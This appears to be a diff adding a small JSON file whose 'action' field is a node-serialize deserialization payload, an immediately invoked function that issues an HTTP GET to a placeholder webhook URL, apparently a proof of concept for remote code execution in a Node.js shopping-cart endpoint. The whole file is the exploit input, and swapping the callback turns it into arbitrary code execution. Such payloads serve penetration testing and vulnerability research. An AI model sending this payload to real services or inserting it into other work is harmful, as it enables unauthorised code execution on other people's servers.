@@ -1,0 +1,4 @@
+{
+  "action": "_$$ND_FUNC$$_function(){require('http').get('http://<your-webhook-url>?test=hello')}()",
+  "cart_id": "test"
+}
